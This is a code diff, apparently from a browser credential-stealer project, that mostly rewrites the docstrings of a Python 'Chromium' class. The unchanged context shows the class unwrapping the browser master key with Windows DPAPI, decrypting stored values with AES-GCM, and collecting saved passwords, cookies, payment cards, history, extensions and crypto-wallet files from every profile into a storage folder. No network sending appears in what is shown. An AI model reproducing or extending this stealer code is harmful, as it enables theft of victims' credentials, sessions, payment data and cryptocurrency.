@@ -34,7 +34,12 @@ class Chromium:
     def _get_profiles(self) -> list:
         """
         Collects all browser profiles.
-        :return: list
+
+        Parameters:
+        - None.
+
+        Returns:
+        - list: List of all browser profiles.
         """
         if self.__browser_path[-9:] in ["User Data"]:
 
@@ -46,7 +51,12 @@ class Chromium:
     def _check_paths(self) -> None:
         """
         Checks if a browser is installed and if data collection from it is enabled.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         if path.exists(self.__browser_path) and any(self.__statuses):
 
@@ -56,10 +66,14 @@ class Chromium:
     @staticmethod
     def _crypt_unprotect_data(encrypted_bytes: b64decode, entropy: bytes = b'') -> bytes:
         """
-        Decrypts encrypted data.
-        :param encrypted_bytes: b64decode
-        :param entropy: bytes
-        :return: bytes
+        Decrypts data previously encrypted using Windows CryptProtectData function.
+
+        Parameters:
+        - encrypted_bytes [b64decode]: The encrypted data to be decrypted.
+        - entropy [bytes]: Optional entropy to provide additional security during decryption.
+
+        Returns:
+        - bytes: Decrypted data as bytes.
         """
         blob = DataBlob()
 
@@ -73,8 +87,13 @@ class Chromium:
 
     def _get_key(self) -> bytes:
         """
-        Gets the decryption key.
-        :return: bytes
+        Receives the decryption key.
+
+        Parameters:
+        - None.
+
+        Returns:
+        - bytes: Decryption key.
         """
         with open(self.__state_path, "r", encoding="utf-8") as state:
             file = state.read()
@@ -87,8 +106,12 @@ class Chromium:
     def _get_datetime(date: int) -> str:
         """
         Converts timestamp to date.
-        :param date: int
-        :return: str
+
+        Parameters:
+        - date [int]: Date to be converted.
+
+        Returns:
+        - str: Converted date or error message.
         """
         try:
             return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
@@ -96,12 +119,16 @@ class Chromium:
             return "Can't decode"
 
     @staticmethod
-    def _decrypt(value: bytes, master_key: bytes = None) -> str:
+    def _decrypt(value: bytes, master_key: bytes) -> str:
         """
         Decrypts the value with the master key.
-        :param value: bytes
-        :param master_key: bytes
-        :return: str
+
+        Parameters:
+        - value [bytes]: The value to be decrypted.
+        - master_key [bytes]: Decryption key.
+
+        Returns:
+        - str: Decrypted string.
         """
         try:
             return AESModeOfOperationGCM(master_key, value[3:15]).decrypt(value[15:])[:-16].decode()
@@ -112,8 +139,12 @@ class Chromium:
     def _get_db_connection(database: str) -> Tuple[Cursor, Connection]:
         """
         Creates a connection with the database.
-        :param database: str
-        :return: (Cursor, Connection)
+
+        Parameters:
+        - database [str]: Path to database.
+
+        Returns:
+        - tuple: Cursor and Connection objects.
         """
         with connect(database) as connection:
             connection.text_factory = lambda text: text.decode(errors="ignore")
@@ -125,8 +156,12 @@ class Chromium:
     def _get_file(file_path: str) -> str:
         """
         Reads the file contents.
-        :param file_path: str
-        :return: str
+
+        Parameters:
+        - file_path [str]: Path to file.
+
+        Returns:
+        - str: File content.
         """
         with open(file_path, "r", encoding="utf-8") as file:
             data = file.read()
@@ -136,11 +171,16 @@ class Chromium:
     def _copy_files(self, profile: str, storage_path: str, main_path: str, alt_path: str = None, error: str = "") -> bool:
         """
         Copies the file/directory or prints an error if it is not found.
-        :param storage_path: str
-        :param main_path: str
-        :param alt_path: str
-        :param error: str
-        :return: bool
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - storage_path [str]: Destination path.
+        - main_path [str]: Path of the file or directory to be copied.
+        - alt_path [str]: Spare path of the file or directory to be copied.
+        - error [str]: Error that will be displayed if the path does not exist.
+
+        Returns:
+        - bool: True or False depending on the success of the execution.
         """
         if path.isfile(main_path) or (alt_path and path.isfile(alt_path)):
             copy = copyfile
@@ -162,10 +202,14 @@ class Chromium:
     def _grab_passwords(self, profile: str, main_path: str, alt_path: str = None) -> None:
         """
         Collects browser passwords.
-        :param profile: str
-        :param main_path: str
-        :param alt_path: str
-        :return: None
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - main_path [str]: Path of the file to be processed.
+        - alt_path [str]: Spare path of the file to be processed.
+
+        Returns:
+        - None.
         """
         filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Passwords.db")
 
@@ -196,10 +240,14 @@ class Chromium:
     def _grab_cookies(self, profile: str, main_path: str, alt_path: str = None) -> None:
         """
         Collects browser cookies.
-        :param profile: str
-        :param main_path: str
-        :param alt_path: str
-        :return: None
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - main_path [str]: Path of the file to be processed.
+        - alt_path [str]: Spare path of the file to be processed.
+
+        Returns:
+        - None.
         """
         filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Cookies.db")
 
@@ -232,10 +280,14 @@ class Chromium:
     def _grab_cards(self, profile: str, main_path: str, alt_path: str = None) -> None:
         """
         Collects browser cards.
-        :param profile: str
-        :param main_path: str
-        :param alt_path: str
-        :return: None
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - main_path [str]: Path of the file to be processed.
+        - alt_path [str]: Spare path of the file to be processed.
+
+        Returns:
+        - None.
         """
         filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Cards.db")
 
@@ -266,10 +318,14 @@ class Chromium:
     def _grab_history(self, profile: str, main_path: str, alt_path: str = None) -> None:
         """
         Collects browser history.
-        :param profile: str
-        :param main_path: str
-        :param alt_path: str
-        :return: None
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - main_path [str]: Path of the file to be processed.
+        - alt_path [str]: Spare path of the file to be processed.
+
+        Returns:
+        - None.
         """
         filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} History.db")
 
@@ -301,10 +357,14 @@ class Chromium:
     def _grab_bookmarks(self, profile: str, main_path: str, alt_path: str = None) -> None:
         """
         Collects browser bookmarks.
-        :param profile: str
-        :param main_path: str
-        :param alt_path: str
-        :return: None
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - main_path [str]: Path of the file to be processed.
+        - alt_path [str]: Spare path of the file to be processed.
+
+        Returns:
+        - None.
         """
         filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Bookmarks")
 
@@ -330,28 +390,32 @@ class Chromium:
 
         bookmarks.close()
 
-    def _grab_extensions(self, profile: str, extension: str) -> None:
+    def _grab_extensions(self, profile: str, extensions_path: str) -> None:
         """
         Collects browser extensions.
-        :param profile: str
-        :param extension: str
-        :return: None
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - extensions_path [str]: Path to the extensions directory.
+
+        Returns:
+        - None.
         """
         extensions_list = []
-        extensions_dirs = listdir(extension)
+        extensions_dirs = listdir(extensions_path)
 
         if len(extensions_dirs) == 0:
             return
 
         for dirpath in extensions_dirs:
 
-            extension_dir = listdir(path.join(extension, dirpath))
+            extension_dir = listdir(path.join(extensions_path, dirpath))
 
             if len(extension_dir) == 0:
                 continue
 
             extension_dir = extension_dir[-1]
-            manifest_path = path.join(extension, dirpath, extension_dir, "manifest.json")
+            manifest_path = path.join(extensions_path, dirpath, extension_dir, "manifest.json")
 
             with open(manifest_path, "r", encoding="utf-8") as file:
                 manifest = load(file)
@@ -370,9 +434,13 @@ class Chromium:
     def _grab_wallets(self, profile: str, wallets: str) -> None:
         """
         Collects browser wallets.
-        :param profile: str
-        :param wallets: str
-        :return: None
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - wallets [str]: Path to the wallets directory.
+
+        Returns:
+        - None.
         """
         for wallet in self.__config.WalletLogs[self.__browser_name]:
 
@@ -387,8 +455,12 @@ class Chromium:
     def _process_profile(self, profile: str) -> None:
         """
         Collects browser profile data.
-        :param profile: str
-        :return: None
+
+        Parameters:
+        - profile [str]: Browser profile.
+
+        Returns:
+        - None.
         """
         profile_name = profile.replace("\\", "/").split("/")[-1]
         functions = [
@@ -444,7 +516,12 @@ class Chromium:
     def _check_profiles(self) -> None:
         """
         Collects data for each browser profile.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         if not self.__profiles:
             print(f"[{self.__browser_name}]: No profiles found")
@@ -458,7 +535,12 @@ class Chromium:
     def run(self) -> None:
         """
         Launches the browser data collection module.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         try:
 
